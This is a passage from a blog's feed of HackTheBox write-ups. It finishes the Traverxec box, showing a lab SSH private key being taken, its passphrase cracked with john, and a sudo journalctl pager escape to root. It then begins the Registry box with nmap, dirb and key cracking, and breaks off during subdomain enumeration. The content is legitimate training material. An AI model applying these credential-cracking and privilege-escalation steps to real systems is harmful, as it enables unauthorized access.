&lt;p&gt;First of all we use python to get a proper shell &lt;code&gt;python -c 'import pty; pty.spawn("/bin/sh")'&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The we go in the &lt;code&gt;public_www&lt;/code&gt; folder inside david's home folder. We see that
there is a backup of some SSH identity files in a targz archive.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cd /home/david/public_www/&lt;/span&gt;
&lt;span class="code-line"&gt;cd /home/david/public_www/&lt;/span&gt;
&lt;span class="code-line"&gt;$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;ls&lt;/span&gt;
&lt;span class="code-line"&gt;index.html  protected-file-area&lt;/span&gt;
&lt;span class="code-line"&gt;$ ls protected-file-area&lt;/span&gt;
&lt;span class="code-line"&gt;cls protected-file-area&lt;/span&gt;
&lt;span class="code-line"&gt;backup-ssh-identity-files.tgz&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We copy the archive to &lt;code&gt;/tmp/&lt;/code&gt;, extract it and cat the private RSA key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;$ cd /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;cd /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;$ tar xvf backup-ssh-identity-files.tgz&lt;/span&gt;
&lt;span class="code-line"&gt;tar xvf backup-ssh-identity-files.tgz&lt;/span&gt;
&lt;span class="code-line"&gt;home/david/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;home/david/.ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;home/david/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;home/david/.ssh/id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat home/david/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;cat home/david/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
&lt;span class="code-line"&gt;DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG&lt;/span&gt;
&lt;span class="code-line"&gt;tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W&lt;/span&gt;
&lt;span class="code-line"&gt;KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU&lt;/span&gt;
&lt;span class="code-line"&gt;RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7&lt;/span&gt;
&lt;span class="code-line"&gt;HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc&lt;/span&gt;
&lt;span class="code-line"&gt;Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec&lt;/span&gt;
&lt;span class="code-line"&gt;dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN&lt;/span&gt;
&lt;span class="code-line"&gt;6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO&lt;/span&gt;
&lt;span class="code-line"&gt;xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1&lt;/span&gt;
&lt;span class="code-line"&gt;Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6&lt;/span&gt;
&lt;span class="code-line"&gt;i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T&lt;/span&gt;
&lt;span class="code-line"&gt;fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA&lt;/span&gt;
&lt;span class="code-line"&gt;bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so&lt;/span&gt;
&lt;span class="code-line"&gt;uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I&lt;/span&gt;
&lt;span class="code-line"&gt;Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s&lt;/span&gt;
&lt;span class="code-line"&gt;9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U&lt;/span&gt;
&lt;span class="code-line"&gt;rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua&lt;/span&gt;
&lt;span class="code-line"&gt;4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU&lt;/span&gt;
&lt;span class="code-line"&gt;/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX&lt;/span&gt;
&lt;span class="code-line"&gt;JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+&lt;/span&gt;
&lt;span class="code-line"&gt;XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh&lt;/span&gt;
&lt;span class="code-line"&gt;hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf&lt;/span&gt;
&lt;span class="code-line"&gt;SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM&lt;/span&gt;
&lt;span class="code-line"&gt;j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt&lt;/span&gt;
&lt;span class="code-line"&gt;VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then try to connect to the box using the key with david account but the SSH
key is password protected. We use ssh2john to get a crackable hash and run john
with the rockyou dictionary on it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
&lt;span class="code-line"&gt;john  id_rsa.hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;hunter           (id_rsa)&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2019-11-27 15:12) 0.2061g/s 2957Kp/s 2957Kc/s 2957KC/s *7¡Vamos!&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then connect to the box as david using the SSH key and its &lt;code&gt;hunter&lt;/code&gt; password.
And we get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh david@10.10.10.165 -i id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;id_rsa&amp;#39;:&lt;/span&gt;
&lt;span class="code-line"&gt;Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Wed Nov 27 05:55:05 2019 from 10.10.14.25&lt;/span&gt;
&lt;span class="code-line"&gt;david@traverxec:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;7db0b&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root-part"&gt;Root part&lt;/h1&gt;
&lt;p&gt;When trying the command &lt;code&gt;sudo -l&lt;/code&gt; we are prompt for a password. Neither the
cracked passwords &lt;code&gt;hunter&lt;/code&gt; nor &lt;code&gt;Nowonly4me&lt;/code&gt; works.&lt;/p&gt;
&lt;p&gt;In the david home folder we find a &lt;code&gt;bin&lt;/code&gt; folder containing a bash program.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;cat /home/david/bin/server-stats.head&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Load: `/usr/bin/uptime`&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Last 5 journal log lines:&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service &lt;span class="p"&gt;|&lt;/span&gt; /usr/bin/cat&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The interesting part is the last line. This mean that we have the &lt;code&gt;sudo&lt;/code&gt;
permissions as &lt;code&gt;root&lt;/code&gt; with no password (as it is in a script).
The &lt;code&gt;sudo&lt;/code&gt; rights are well designed, we cannot change any argument in the line.
If we look at
&lt;a href="https://gtfobins.github.io/gtfobins/journalctl/"&gt;gtfobins for journalctl&lt;/a&gt; we
see that the interesting part is to get the pager (which by default is &lt;code&gt;less&lt;/code&gt;,
which allow to run bash command with &lt;code&gt;!&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;As the command specifiecaly allow us to only have 5 lines from the &lt;code&gt;journalctl&lt;/code&gt;
output what we need to do is to get a tiny tiny windows to trigger the pager.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Tiny window in order to trigger the pager" src="/media/2020.04/traverxec_3.png"&gt;&lt;/p&gt;
&lt;p&gt;From &lt;code&gt;less&lt;/code&gt; we are able to run a bash command as &lt;code&gt;/bin/bash/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Running a bash command from less" src="/media/2020.04/traverxec_4.png"&gt;&lt;/p&gt;
&lt;p&gt;We then get a root shell and are able to get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service&lt;/span&gt;
&lt;span class="code-line"&gt;-- Logs begin at Wed 2019-11-27 05:44:37 EST, end at Wed 2019-11-27 06:15:38 EST&lt;/span&gt;
&lt;span class="code-line"&gt;Nov 27 06:11:16 traverxec crontab[4166]: (www-data) LIST (www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;Nov 27 06:12:32 traverxec sudo[4554]: pam_unix(sudo:auth): authentication failur&lt;/span&gt;
&lt;span class="code-line"&gt;...skipping...&lt;/span&gt;
&lt;span class="code-line"&gt;Nov 27 06:12:41 traverxec sudo[4554]: www-data : user NOT in sudoers ; TTY=pts/1&lt;/span&gt;
&lt;span class="code-line"&gt;Nov 27 06:13:05 traverxec su[4567]: pam_unix(su:auth): authentication failure; l&lt;/span&gt;
&lt;span class="code-line"&gt;Nov 27 06:13:07 traverxec su[4567]: FAILED SU (to david) www-data on pts/6&lt;/span&gt;
&lt;span class="code-line"&gt;!/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;root@traverxec:/home/david# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;9aa36a6&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box is quit easy. The revershell is quit quick. The privilege escalation to
user might a pain as there is some rabbit holes (like this &lt;code&gt;Nowonly4me&lt;/code&gt;
password) and the root part is quit CTFish but quick.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="nostromo"></category><category term="journalctl"></category></entry><entry><title>HTB: Registry</title><link href="https://maggick.fr/2020/04/htb-registry.html" rel="alternate"></link><published>2020-04-04T19:40:00+02:00</published><updated>2020-04-04T19:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-04:/2020/04/htb-registry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2020.04/registry_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/213"&gt;Registry&lt;/a&gt;.
This box is rated as a hard box. It was release on October 19 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/4615"&gt;thek&lt;/a&gt;. It implies a few
rabbit holes, the Docker registry API, the Bolt CMS, and the SUID binary &lt;code&gt;restic&lt;/code&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.04/registry_card.png" alt="Jarvis Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/213"&gt;Registry&lt;/a&gt;.
This box is rated as a hard box. It was release on October 19 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/4615"&gt;thek&lt;/a&gt;. It implies a few
rabbit holes, the Docker registry API, the Bolt CMS, and the SUID binary &lt;code&gt;restic&lt;/code&gt;.&lt;/p&gt;


&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#getting-user"&gt;Getting user&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#subdomain"&gt;subdomain&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#docker-registry-api"&gt;Docker registry API&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#blobs"&gt;Blobs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#getting-root"&gt;Getting root&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#enumeration"&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#bolt-archive"&gt;Bolt archive&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#appconfig"&gt;app/config&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#appdatabase"&gt;app/database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#production-db"&gt;Production DB&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#bolt-cms"&gt;Bolt CMS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#www-data"&gt;www-data&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; TCP scan. The ports 22 (SSH), 80 (HTTP),
443(HTTPS) and 32115 are open:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Nov 28 07:53:01 2019 as: nmap -p- -oA nmap 10.10.10.159&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.159&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65531 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp   open  https&lt;/span&gt;
&lt;span class="code-line"&gt;32115/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Nov 28 08:05:18 2019 -- 1 IP address (1 host up) scanned in 737.00 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us see what services are running on this ports.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Nov 28 08:05:53 2019 as: nmap -p22,80,443,32115 -sSV -oA services 10.10.10.159&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.159&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.084s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http     nginx 1.14.0 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp   open  ssl/http nginx 1.14.0 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;32115/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Nov 28 08:06:18 2019 -- 1 IP address (1 host up) scanned in 24.72 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;On both port 80 and 443 we get the default Nginx home page.&lt;/p&gt;
&lt;p&gt;&lt;img alt="default nginx homepage" src="/media/2020.04/registry_0.png"&gt;&lt;/p&gt;
&lt;p&gt;We run a &lt;code&gt;dirb&lt;/code&gt; at it. The tool found a few interesting files in &lt;code&gt;.ssh.&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;authorized_keys&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;id_rsa&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is the dirb output:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;OUTPUT_FILE: dirb_ip&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Tue Dec  3 07:40:04 2019&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.159/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.159/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.159/.bash_history (CODE:403|SIZE:580)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.159/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.159/fuck/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.159/index.html (CODE:200|SIZE:612)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.159/install/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.159/.ssh/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.159/.ssh/authorized_keys (CODE:200|SIZE:395)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.159/.ssh/id_rsa (CODE:200|SIZE:1766)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.159/.ssh/password (CODE:200|SIZE:10)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.159/fuck/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.159/install/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.159/install/index.php (CODE:200|SIZE:1050)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;END_TIME: Tue Dec  3 08:10:46 2019&lt;/span&gt;
&lt;span class="code-line"&gt;DOWNLOADED: 18448 - FOUND: 6&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code&gt;password&lt;/code&gt; file contain a single "word": &lt;code&gt;awwwwwwww&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The SSH key is password protected, we extract the hash for john and run it to
find the password: &lt;code&gt;rootroot&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
&lt;span class="code-line"&gt;$ john  id_rsa.hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;rootroot         (id_rsa)&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:11 DONE (2019-12-03 13:51) 0.08635g/s 1238Kp/s 1238Kc/s 1238KC/s *7¡Vamos!&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The SSH key doesn't let us login anywhere. It will prove later than both the SSH
key and the password were just a rabbit hole.&lt;/p&gt;
&lt;h2 id="subdomain"&gt;subdomain&lt;/h2&gt;
&lt;p&gt;We take a look at the SSL certificate and we see that there is a interesting
sub domain: &lt;a href="https://docker.registry.htb/"&gt;https://docker.registry.htb/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="default Nginx homepage" src="/media/2020.04/registry_1.png"&gt;&lt;/p&gt;
&lt;p&gt;We run another &lt;code&gt;dirb&lt;/code&gt; at it and found an interesting page:
&lt;a href="https://docker.registry.htb/v2"&gt;https://docker.registry.htb/v2&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Thu Nov 28 08:28:46 2019&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: https://docker.registry.htb/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
